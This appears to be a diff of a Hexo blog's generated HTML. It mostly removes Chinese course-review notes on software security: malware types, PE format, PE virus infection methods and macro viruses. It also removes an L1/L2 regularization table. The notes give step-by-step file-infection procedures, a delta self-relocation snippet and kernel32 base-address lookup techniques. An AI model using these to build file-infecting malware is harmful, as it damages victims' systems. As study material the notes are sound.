-<h2 id="L1-和-L2-正则化的比较"><a href="#L1-和-L2-正则化的比较" class="headerlink" title="L1 和 L2 正则化的比较"></a><strong>L1 和 L2 正则化的比较</strong></h2><table>
-<thead>
-<tr>
-<th>特性</th>
-<th>L1 正则化</th>
-<th>L2 正则化</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>惩罚项</strong></td>
-<td>( \lambda \sum_{i&#x3D;1}^{n}</td>
-<td>\theta_i</td>
-</tr>
-<tr>
-<td><strong>解的性质</strong></td>
-<td>稀疏解（部分参数为零）</td>
-<td>非稀疏解（参数趋近于零）</td>
-</tr>
-<tr>
-<td><strong>特征选择</strong></td>
-<td>支持</td>
-<td>不支持</td>
-</tr>
-<tr>
-<td><strong>对异常值的鲁棒性</strong></td>
-<td>较强</td>
-<td>较弱</td>
-</tr>
-<tr>
-<td><strong>计算复杂度</strong></td>
-<td>较高（不可导）</td>
-<td>较低（可导）</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="正则化的选择"><a href="#正则化的选择" class="headerlink" title="正则化的选择"></a><strong>正则化的选择</strong></h2><ol>
-<li><p><strong>L1 正则化的适用场景</strong>：</p>
-<ul>
-<li>特征维度较高, 且只有少数特征对预测结果有显著影响。</li>
-<li>需要进行特征选择。</li>
-</ul>
-</li>
-<li><p><strong>L2 正则化的适用场景</strong>：</p>
-<ul>
-<li>特征维度较高, 且特征之间存在相关性。</li>
-<li>需要平滑模型参数, 防止过拟合。</li>
-</ul>
-</li>
-<li><p><strong>结合使用（Elastic Net）</strong>：</p>
-<ul>
-<li>在某些情况下, 可以同时使用 L1 和 L2 正则化, 称为 Elastic Net：<br>$$<br>J(\theta) &#x3D; \text{Loss}(\theta) + \lambda_1 \sum_{i&#x3D;1}^{n} |\theta_i| + \lambda_2 \sum_{i&#x3D;1}^{n} \theta_i^2<br>$$</li>
-<li>Elastic Net 结合了 L1 和 L2 正则化的优点, 适用于高维数据且特征之间存在相关性的情况。</li>
-</ul>
-</li>
-</ol>
 
+      <time title="Created: 2025-02-21 08:47:19 / Modified: 17:22:00" itemprop="dateCreated datePublished" datetime="2025-02-21T08:47:19+08:00">2025-02-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>课程设计</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/02/21/%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/02/13/Lecture9/" data-id="cm7e2695o0004p0tx9iwbcskm" data-title="Lecture9" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2018Autumn/" rel="tag">2018Autumn</a></li></ul>
 
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
     </footer>
-  </div>
-  
-</article>
+  </article>
+</div>
 
 
 
-  
-    <article id="post-软件安全复习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/" class="article-date">
-  <time class="dt-published" datetime="2025-02-13T11:15:28.000Z" itemprop="datePublished">2025-02-13</time>
-</a>
+
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
+
+
+<div class="post-block">
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/">软件安全复习</a>
-    </h1>
   
 
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/13/Lecture9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/13/Lecture9/" class="post-title-link" itemprop="url">Lecture9</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-02-13 19:34:46" itemprop="dateCreated datePublished" datetime="2025-02-13T19:34:46+08:00">2025-02-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-02-21 17:19:56" itemprop="dateModified" datetime="2025-02-21T17:19:56+08:00">2025-02-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
       </header>
+
     
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="第三章-恶意代码"><a href="#第三章-恶意代码" class="headerlink" title="第三章 恶意代码"></a>第三章 恶意代码</h1><h2 id="恶意代码与正常软件安全问题的差异"><a href="#恶意代码与正常软件安全问题的差异" class="headerlink" title="恶意代码与正常软件安全问题的差异"></a>恶意代码与正常软件安全问题的差异</h2><p>恶意代码：设计目的是用来实现恶意功能的代码或程序<br>正常软件也会引发安全问题，但绝大多数情况并非作者有意</p>
-<h2 id="恶意代码攻击目的"><a href="#恶意代码攻击目的" class="headerlink" title="恶意代码攻击目的"></a>恶意代码攻击目的</h2><p>恶作剧和炫耀技术<br>追求经济利益<br>参与商业竞争<br>实现政治意图<br>服务于军事目标</p>
-<h2 id="恶意代码攻击目标"><a href="#恶意代码攻击目标" class="headerlink" title="恶意代码攻击目标"></a>恶意代码攻击目标</h2><p>括但不限于个人计算机、服务器、移动智能终端（如手机和平板）、各种智能设备（例如特斯拉汽车、智能家居系统、智能手表等）、通信设备（如路由器和交换机）以及安全防护设备（如防火墙、入侵检测&#x2F;防御系统）。攻击者既可以选择定点攻击，针对特定的邮件地址、IP地址、域名、即时通讯账号或特定的服务器和个人进行精确打击；也可以实施群体性杀伤，利用挂马网站、钓鱼邮件等方式，或者通过病毒和蠕虫的自动扩散机制来影响尽可能多的目标。</p>
-<h2 id="恶意代码功能"><a href="#恶意代码功能" class="headerlink" title="恶意代码功能"></a>恶意代码功能</h2><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><ul>
-<li><p>静态数据：</p>
-<ul>
-<li>文件</li>
-<li>数据库等</li>
-</ul>
-</li>
-<li><p>动态数据：</p>
-<ul>
-<li>口令</li>
-<li>内存</li>
-<li>计算机网络流量</li>
-<li>通信网络数据</li>
-<li>可移动存储介质</li>
-<li>隔离电脑等</li>
-</ul>
-</li>
-</ul>
-<h3 id="动态控制与渗透拓展攻击路径"><a href="#动态控制与渗透拓展攻击路径" class="headerlink" title="动态控制与渗透拓展攻击路径"></a>动态控制与渗透拓展攻击路径</h3><ul>
-<li>中间系统</li>
-<li>相关人员</li>
-</ul>
-<h3 id="破坏系统"><a href="#破坏系统" class="headerlink" title="破坏系统"></a>破坏系统</h3><ul>
-<li><p>数据：</p>
-<ul>
-<li>删除数据</li>
-<li>修改数据</li>
-</ul>
-</li>
-<li><p>系统服务：</p>
-<ul>
-<li>通用Web服务系统</li>
-<li>数据库系统</li>
-<li>特定行业服务系统（如工控）</li>
-</ul>
-</li>
-<li><p>支撑设备：</p>
-<ul>
-<li>网络设备</li>
-<li>线路等</li>
-</ul>
-</li>
-</ul>
-<h2 id="计算机病毒与蠕虫定义（典型例子、各自特点、两者差异）"><a href="#计算机病毒与蠕虫定义（典型例子、各自特点、两者差异）" class="headerlink" title="计算机病毒与蠕虫定义（典型例子、各自特点、两者差异）"></a>计算机病毒与蠕虫定义（典型例子、各自特点、两者差异）</h2><p>计算机病毒：通过感染计算机文件进行传播，以破坏或篡改用户数据，影响信息系统正常运行为主要目的的恶意程序。<br>蠕虫：可以独立运行，能够自我复制和广泛传播，以占用系统和网络资源为主要目的的恶意程序。<br>两者差异<br>传播方式：病毒必须依靠宿主文件执行才能开始感染过程；而蠕虫可以独立运作并主动搜索新的感染目标。<br>速度：由于不需要等待宿主文件被打开，蠕虫往往比病毒更快地扩散。<br>影响范围：蠕虫倾向于更广泛地传播，因为它们能够自动化地寻找和感染更多机器。</p>
-<h2 id="木马与后门定义（典型例子、各自特点）"><a href="#木马与后门定义（典型例子、各自特点）" class="headerlink" title="木马与后门定义（典型例子、各自特点）"></a>木马与后门定义（典型例子、各自特点）</h2><p>木马：是指一类看起来具有正常功能，但实际上隐藏者很多用户不希望功能的程序，不具有自我传播能力。通常由控制端和被控制端两端组成。<br>后门：使攻击者可以对系统进行非授权访问的程序。<br>总的来说。木马是以欺骗的方式获取用户的信任从而侵入系统，而后门则是为了方便攻击者日后再次进入系统所设置的秘密通道。</p>
-<h2 id="相关法律"><a href="#相关法律" class="headerlink" title="相关法律"></a>相关法律</h2><p><img src="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/image-9.png" alt="alt text"><br><img src="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/image-13.png" alt="alt text"></p>
-<h1 id="第四章-PE文件"><a href="#第四章-PE文件" class="headerlink" title="第四章 PE文件"></a>第四章 PE文件</h1><h2 id="PE文件基本格式"><a href="#PE文件基本格式" class="headerlink" title="PE文件基本格式"></a>PE文件基本格式</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zheh/p/4008268.html">https://www.cnblogs.com/zheh/p/4008268.html</a></p>
-<h2 id="如何通过函数名定位函数导出地址"><a href="#如何通过函数名定位函数导出地址" class="headerlink" title="如何通过函数名定位函数导出地址"></a>如何通过函数名定位函数导出地址</h2><h3 id="1-确定PE文件头的位置"><a href="#1-确定PE文件头的位置" class="headerlink" title="1. 确定PE文件头的位置"></a>1. 确定PE文件头的位置</h3><p>PE文件开始于一个DOS MZ头部，紧接着是一个PE签名和PE文件头。你需要先找到PE文件头的位置。</p>
-<ul>
-<li>使用 <code>IMAGE_DOS_HEADER</code> 结构体中的 <code>e_lfanew</code> 成员来获取PE头部相对于文件起始位置的偏移量。</li>
-</ul>
-<h3 id="2-解析PE文件头"><a href="#2-解析PE文件头" class="headerlink" title="2. 解析PE文件头"></a>2. 解析PE文件头</h3><p>从PE头部开始，可以找到指向不同数据目录的指针，包括导出表。</p>
-<ul>
-<li>PE头部包含了一个 <code>IMAGE_FILE_HEADER</code> 和一个 <code>IMAGE_OPTIONAL_HEADER</code>。</li>
-<li>在 <code>IMAGE_OPTIONAL_HEADER</code> 中有一个 <code>DataDirectory</code> 数组，其中第一个元素是 <code>IMAGE_DIRECTORY_ENTRY_EXPORT</code>，它指向导出表。</li>
-</ul>
-<h3 id="3-解析导出表"><a href="#3-解析导出表" class="headerlink" title="3. 解析导出表"></a>3. 解析导出表</h3><p>导出表由 <code>IMAGE_EXPORT_DIRECTORY</code> 结构定义，该结构包含了访问实际导出函数所需的信息。</p>
-<ul>
-<li><code>AddressOfFunctions</code>：指向一个RVA（相对虚拟地址）数组，这些RVA指向实际函数的地址。</li>
-<li><code>AddressOfNames</code>：指向一个RVA数组，这些RVA指向函数名称字符串。</li>
-<li><code>AddressOfNameOrdinals</code>：指向一个短整型数组，这些值对应于 <code>AddressOfFunctions</code> 数组的索引，用于将函数名映射到函数地址。</li>
-</ul>
-<h3 id="4-查找函数名并获取其地址"><a href="#4-查找函数名并获取其地址" class="headerlink" title="4. 查找函数名并获取其地址"></a>4. 查找函数名并获取其地址</h3><p>要通过函数名查找其地址，需要遍历 <code>AddressOfNames</code> 指向的数组，直到找到与目标函数名匹配的项。</p>
-<ul>
-<li>对每个函数名，使用 <code>AddressOfNameOrdinals</code> 来确定它对应的 <code>AddressOfFunctions</code> 数组中的索引。</li>
-<li>用这个索引从 <code>AddressOfFunctions</code> 获取函数的实际地址（RVA）。</li>
-</ul>
-<h3 id="5-将RVA转换为文件偏移量"><a href="#5-将RVA转换为文件偏移量" class="headerlink" title="5. 将RVA转换为文件偏移量"></a>5. 将RVA转换为文件偏移量</h3><p>由于 <code>AddressOfFunctions</code> 返回的是RVA，而你可能需要文件偏移量来直接读取或修改PE文件。</p>
-<ul>
-<li>遍历PE头部的节表（Section Headers），根据RVA所在的区间计算出正确的文件偏移量。</li>
-</ul>
-<h3 id="示例代码片段（伪代码）"><a href="#示例代码片段（伪代码）" class="headerlink" title="示例代码片段（伪代码）"></a>示例代码片段（伪代码）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 假设已经加载了PE文件到内存，并且有指针指向PE头</span><br><span class="line">peHeader = GetPEHeader(peFile);</span><br><span class="line"></span><br><span class="line">// 导出表位于 IMAGE_DIRECTORY_ENTRY_EXPORT 数据目录中</span><br><span class="line">exportDirRVA = peHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line"></span><br><span class="line">// 读取 IMAGE_EXPORT_DIRECTORY 结构</span><br><span class="line">exportDir = ReadStructureAtRVA(peFile, exportDirRVA, IMAGE_EXPORT_DIRECTORY);</span><br><span class="line"></span><br><span class="line">// 遍历 AddressOfNames 数组寻找目标函数名</span><br><span class="line">for (i = 0; i &lt; exportDir.NumberOfNames; i++) &#123;</span><br><span class="line">    funcNameRVA = ReadDWORDAtRVA(peFile, exportDir.AddressOfNames + i * 4);</span><br><span class="line">    funcName = ReadStringAtRVA(peFile, funcNameRVA);</span><br><span class="line">    </span><br><span class="line">    if (funcName == targetFunctionName) &#123;</span><br><span class="line">        ordinal = ReadWORDAtRVA(peFile, exportDir.AddressOfNameOrdinals + i * 2);</span><br><span class="line">        funcAddrRVA = ReadDWORDAtRVA(peFile, exportDir.AddressOfFunctions + ordinal * 4);</span><br><span class="line">        </span><br><span class="line">        // 将 RVA 转换为文件偏移量以获取真实地址</span><br><span class="line">        funcAddrOffset = RvaToFileOffset(peFile, funcAddrRVA);</span><br><span class="line">        return funcAddrOffset;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 如果没有找到目标函数名则返回错误</span><br><span class="line">return ERROR_NOT_FOUND;</span><br></pre></td></tr></table></figure>
-
-<h2 id="资源节"><a href="#资源节" class="headerlink" title="资源节"></a>资源节</h2><p>资源节一般名为.rsrc</p>
-<h3 id="如何定位资源"><a href="#如何定位资源" class="headerlink" title="如何定位资源"></a>如何定位资源</h3><p>通过每个元素，可以找到第二层另一个IMAGE_RESOURCE_ DIRECTORY，后面紧跟着IMAGE_RESOURCE_DIRECTORY_ENTRY数组,这一层的数组的每个元素代表的资源名字不同；</p>
-<p>然后可以找到第三层的每个IMAGE_ RESOURCE_DIRECTORY，后面紧跟着IMAGE_RESOURCE_DIRECTORY_ENTRY数组。这一层的数组的每个元素代表的资源语言不同；</p>
-<p>最后通过每个IMAGE_RESOURCE_ DIRECTORY_ENTRY可以找到每个IMAGE_RESOURCE_DATA_ENTRY。通过每个IMAGE_RESOURCE_DATA_ENTRY，就可以找到每个真正的资源。</p>
-<h2 id="重定位节"><a href="#重定位节" class="headerlink" title="重定位节"></a>重定位节</h2><p>重定位节存放了一个重定位表。若装载器不是把程序装到程序编译时默认的基地址时，就需要这个重定位表来做一些调整。<br>一般DLL都有，但是exe没有。<br>重定位节以IMAGE_BASE_RELOCATION结构开始。</p>
-<h2 id="如何判断一个文件为合法的PE文件"><a href="#如何判断一个文件为合法的PE文件" class="headerlink" title="如何判断一个文件为合法的PE文件"></a>如何判断一个文件为合法的PE文件</h2><ol>
-<li>查找MZ头是否为0x4D5A</li>
-<li>如果1符合，则用elfanew指针定位PE头，e-lfanew一般等于0x3C</li>
-<li>如果上面条件符合，则判断PE头是否为0x4550</li>
-</ol>
-<h2 id="如果不适用导入函数节，如何使用外部dll文件中的API函数"><a href="#如果不适用导入函数节，如何使用外部dll文件中的API函数" class="headerlink" title="如果不适用导入函数节，如何使用外部dll文件中的API函数?"></a>如果不适用导入函数节，如何使用外部dll文件中的API函数?</h2><ol>
-<li>使用LoadLibrary函数或GetProcAddress函数</li>
-<li>手动解析对应DLL的PE头，将对应API的RVA转为物理地址，然后以函数指针的形式进行调用。</li>
-</ol>
-<h2 id="kernel32-dll中GetProcAddress函数的实现原理"><a href="#kernel32-dll中GetProcAddress函数的实现原理" class="headerlink" title="kernel32.dll中GetProcAddress函数的实现原理?"></a>kernel32.dll中GetProcAddress函数的实现原理?</h2><p>验证输入的路径参数 -&gt; 定位PE头 -&gt; 解析导出表 -&gt; 查找函数地址 -&gt; 处理序号调用 -&gt; return</p>
-<h2 id="可执行程序一般没有重定位节，DLL一般都有重定位节，是什么原因？"><a href="#可执行程序一般没有重定位节，DLL一般都有重定位节，是什么原因？" class="headerlink" title="可执行程序一般没有重定位节，DLL一般都有重定位节，是什么原因？"></a>可执行程序一般没有重定位节，DLL一般都有重定位节，是什么原因？</h2><p>XE 文件通常不包含重定位节是因为它们是为特定的加载地址编译和优化的，并且在大多数情况下可以通过操作系统提供的机制（如 ASLR）来解决潜在的地址冲突问题。相反，DLL 需要更广泛地适应不同的加载环境，因此它们包含了必要的重定位信息，以确保无论加载到哪里都可以正确运行。这种设计差异反映了两种类型文件在其生命周期和用途上的根本区别。</p>
-<h1 id="第五章-WindowsPE病毒"><a href="#第五章-WindowsPE病毒" class="headerlink" title="第五章 WindowsPE病毒"></a>第五章 WindowsPE病毒</h1><h2 id="什么叫感染"><a href="#什么叫感染" class="headerlink" title="什么叫感染"></a>什么叫感染</h2><p>在尽量不影响目标程序（系统）正常功能的前提下，使其具有病毒自己的功能。</p>
-<p>PE病毒的分类<br>以感染目标分类分成系统病毒和文件病毒</p>
-<h2 id="传统文件感染型病毒"><a href="#传统文件感染型病毒" class="headerlink" title="传统文件感染型病毒"></a>传统文件感染型病毒</h2><h3 id="感染思路"><a href="#感染思路" class="headerlink" title="感染思路"></a>感染思路</h3><p><img src="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/image.png" alt="alt text"><br>优点：被感染后的程序主体依然是目标程序，不影响目标程序图标，隐蔽性稍好。<br>缺点：对病毒代码的编写要求较高，通常是汇编语言编写，难以成功感染自校验程序。</p>
-<h3 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h3><h4 id="重定位技术"><a href="#重定位技术" class="headerlink" title="重定位技术"></a>重定位技术</h4><p>病毒代码运行过程中自我重定位：计算正确地址与错误地址的偏差，并保存到全局寄存器中；当使用病毒变量时，与该值进行加运算，完成修正。<br><strong>重定位代码</strong> </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Relocate proc</span><br><span class="line">    call delta</span><br><span class="line">delta:</span><br><span class="line">    pop ebx</span><br><span class="line">    sub ebx, offset delta</span><br><span class="line">    ret</span><br><span class="line">Relocate endp</span><br></pre></td></tr></table></figure>
-<h4 id="API函数自获取"><a href="#API函数自获取" class="headerlink" title="API函数自获取"></a>API函数自获取</h4><p>利用kernel32.dll中的 GetProcAddress和LoadLibraryA函数</p>
-<h5 id="如何获取kernel32-dll的基地址"><a href="#如何获取kernel32-dll的基地址" class="headerlink" title="如何获取kernel32.dll的基地址"></a>如何获取kernel32.dll的基地址</h5><p><strong>1. <strong>暴力搜索</strong><br>系统打开一个可执行文件时，它会调用Kernel32.dll中的CreateProcess函数，CreateProcess函数在完成应用程序装载后，会先将返回地址压入到堆栈顶端。当该应用程序结束后，会将返回地址弹出放到EIP中，继续执行。<br>这个返回地址正处于Kernel32.DLL的地址空间之中。这样，利用PE文件格式的相关特征（如03C偏移处内容存放着“PE”标志的内存地址等），在此地址的基础上往低地址方向逐渐搜索，必然可以找到Kernel32.DLL模块的首地址。不过这种暴力搜索方法比较费时，并且可能会碰到一些异常情况。<br>2.  <strong>通过SEH链获得Kernel32模块内地址</strong><br>遍历SEH链，在链中查找prev成员等于0xFFFFFFFF 的EXCEPTION_REGISTER结构，该结构中handler值指向系统异常处理例程，它总是位于Kernel32模块中。根据这一特性，然后进行向前搜索就可以查找Kernel32.DLL在内存中的基地址。<br>3. <strong>通过PEB相关数据获取</strong><br>fs:[0]指向TEB结构，首先从fs:[30h]获得PEB地址，然后通过PEB[0x0c]获得PEB_LDR_DATA数据结构地址,然后通过从PEB_LDR_DATA[0x1c]获取InInitializationOrderModuleList.Flink地址，最后在Flink[0x08]中得到KERNEL32.DLL模块的基地址。<br>这种方法比较通用，适用于2K&#x2F;XP&#x2F;2003。在Exploit的编写中，也通常采用这种方式。</strong></p>
-<h4 id="目标检索（目标程序遍历搜索）"><a href="#目标检索（目标程序遍历搜索）" class="headerlink" title="目标检索（目标程序遍历搜索）"></a>目标检索（目标程序遍历搜索）</h4><p><img src="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/image-10.png" alt="alt text"></p>
-<h4 id="感染模块"><a href="#感染模块" class="headerlink" title="感染模块"></a>感染模块</h4><p>要求病毒代码能够得到运行且程序的正常功能不能被破坏</p>
-<p>代码插入位置：添加新节 碎片式感染</p>
-<h5 id="感染文件的基本步骤："><a href="#感染文件的基本步骤：" class="headerlink" title="感染文件的基本步骤："></a>感染文件的基本步骤：</h5><ol>
-<li>判断目标文件开始的两个字节是否为“MZ”。</li>
-<li>判断PE文件标记“PE”。</li>
-<li>判断感染标记，如果已被感染过则跳出继续执行HOST程序，否则继续。</li>
-<li>获得Directory（数据目录）的个数，（每个数据目录信息占8个字节）。</li>
-<li>得到节表起始位置。（Directory的偏移地址+数据目录占用的字节数&#x3D;节表起始位置）</li>
-<li>得到目前最后节表的末尾偏移（紧接其后用于写入一个新的病毒节）节表起始位置+节的个数*28H (每个节表占用的字节数28H)&#x3D;目前最后节表的末尾偏移。</li>
-<li>开始写入节表和病毒节</li>
-<li>修正文件头信息</li>
-</ol>
-<h3 id="文件感染方式"><a href="#文件感染方式" class="headerlink" title="文件感染方式"></a>文件感染方式</h3><p>文件感染是指恶意代码通过修改或附加到合法文件上来传播自身。以下是几种常见的文件感染方式及其特点：</p>
-<h4 id="添加新节-Append-New-Section"><a href="#添加新节-Append-New-Section" class="headerlink" title="添加新节 (Append New Section)"></a>添加新节 (Append New Section)</h4><ul>
-<li><strong>描述</strong>：增加一个专门用于存放病毒代码的新节。</li>
-<li><strong>注意事项</strong>：<ul>
-<li>需要事先检查PE文件的节表空间是否足够容纳新的节。</li>
-<li>新增的节不会影响原有程序的功能，但会改变文件结构。</li>
-</ul>
-</li>
-</ul>
-<h4 id="碎片式感染-Fragmented-Infection"><a href="#碎片式感染-Fragmented-Infection" class="headerlink" title="碎片式感染 (Fragmented Infection)"></a>碎片式感染 (Fragmented Infection)</h4><ul>
-<li><strong>描述</strong>：将病毒代码分解成小块，并插入到各个节之间的未使用填充区域（如对齐填充）。</li>
-<li><strong>优点</strong>：<ul>
-<li>可以避免显著增大文件大小。</li>
-<li>减少了被检测的风险，因为变化分散且细微。</li>
-</ul>
-</li>
-<li><strong>挑战</strong>：<ul>
-<li>需要精确计算每个碎片的位置，确保不会破坏原有的程序逻辑。</li>
-</ul>
-</li>
-</ul>
-<h4 id="插入式感染-Insertion-Infection"><a href="#插入式感染-Insertion-Infection" class="headerlink" title="插入式感染 (Insertion Infection)"></a>插入式感染 (Insertion Infection)</h4><ul>
-<li><strong>描述</strong>：直接将病毒代码嵌入到宿主文件的现有代码节中，可能是在代码节的中间或前后位置。</li>
-<li><strong>影响</strong>：<ul>
-<li>这种方法通常会导致代码节尺寸的变化。</li>
-<li>可能需要调整某些指针或偏移量，以防止破坏宿主程序的正常执行流程。</li>
-</ul>
-</li>
-<li><strong>风险</strong>：<ul>
-<li>如果处理不当，可能会导致宿主程序无法正确运行。</li>
-</ul>
-</li>
-</ul>
-<h4 id="伴随式感染-Companion-Infection"><a href="#伴随式感染-Companion-Infection" class="headerlink" title="伴随式感染 (Companion Infection)"></a>伴随式感染 (Companion Infection)</h4><ul>
-<li><strong>描述</strong>：<ul>
-<li>典型方法是创建宿主程序的一个备份副本。</li>
-<li>使用病毒体替换原始的宿主程序。</li>
-<li>当病毒被执行时，它会在完成其任务后将控制权交还给备份的宿主程序。</li>
-</ul>
-</li>
-<li><strong>特点</strong>：<ul>
-<li>不直接修改宿主程序本身，而是利用了操作系统解析命令行的方式来进行感染。</li>
-<li>对用户来说，表面上看似乎还是在运行原来的程序。</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="捆绑释放型感染"><a href="#捆绑释放型感染" class="headerlink" title="捆绑释放型感染"></a>捆绑释放型感染</h2><p><strong>将HOST作为数据存储在病毒体内。当执行病毒程序时，还原并执行HOST文件<br><img src="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/image-1.png" alt="alt text"><br>优点：编写简单、效率高。可感染自校验程序<br>缺点：被感染后的程序主体是病毒程序，易被发现（程序叠加＋释放执行），且有程序图标问题。<br>如熊猫烧香病毒</strong></p>
-<h2 id="系统感染型病毒"><a href="#系统感染型病毒" class="headerlink" title="系统感染型病毒"></a>系统感染型病毒</h2><p>这类病毒通常为单独个体，不感染系统内的其他文件。<br>编写这类病毒面临着 如何再次获得控制权和如何传播的两个关键问题</p>
-<p>系统启动环节为BIOS－MBR－DBR－系统内部<br>如熊猫烧香病毒</p>
-<h1 id="第六章-宏病毒与脚本病毒"><a href="#第六章-宏病毒与脚本病毒" class="headerlink" title="第六章 宏病毒与脚本病毒"></a>第六章 宏病毒与脚本病毒</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38474570/article/details/88382677">https://blog.csdn.net/qq_38474570/article/details/88382677</a></p>
-<h2 id="宏的基本概念"><a href="#宏的基本概念" class="headerlink" title="宏的基本概念:"></a>宏的基本概念:</h2><p>宏就是能组织到一起作为独立的命令使用的一系列word命令，可以实现任务执行的自动化，简化日常工作。</p>
-<h2 id="宏病毒"><a href="#宏病毒" class="headerlink" title="宏病毒"></a>宏病毒</h2><p>宏病毒是存在于数据文件或模板中（字处理文档、数据表格、数据库、演示文档等）的计算机病毒，使用宏语言编写，利用宏语言的功能将自己寄生到其他数据文档的病毒。</p>
-<h3 id="宏病毒如何传播"><a href="#宏病毒如何传播" class="headerlink" title="宏病毒如何传播"></a>宏病毒如何传播</h3><p>当打开文档，其中的宏就会被执行，宏病毒就会被激活，并驻留在Normal模板上。所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上</p>
-<h3 id="宏病毒如何获取控制权"><a href="#宏病毒如何获取控制权" class="headerlink" title="宏病毒如何获取控制权"></a>宏病毒如何获取控制权</h3><p><strong>利用自动运行宏<br>许多Office文档格式允许定义某些特定事件触发的宏，例如：<br>AutoOpen：当文档被打开时自动运行。<br>FileOpen 或 Document_Open：在文档打开时运行。<br>AutoExec：在启动应用程序时运行。<br>AutoNew: 在新文档创建时运行。<br>AutoExit: 在应用程序退出时运行。<br>AutoClose：当文档关闭时运行。<br>宏病毒可以编写这样的宏，在用户打开或操作文档时自动激活并传播自己。</strong></p>
-<h3 id="宏病毒感染方案"><a href="#宏病毒感染方案" class="headerlink" title="宏病毒感染方案"></a>宏病毒感染方案</h3><p><img src="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/image-3.png" alt="alt text"></p>
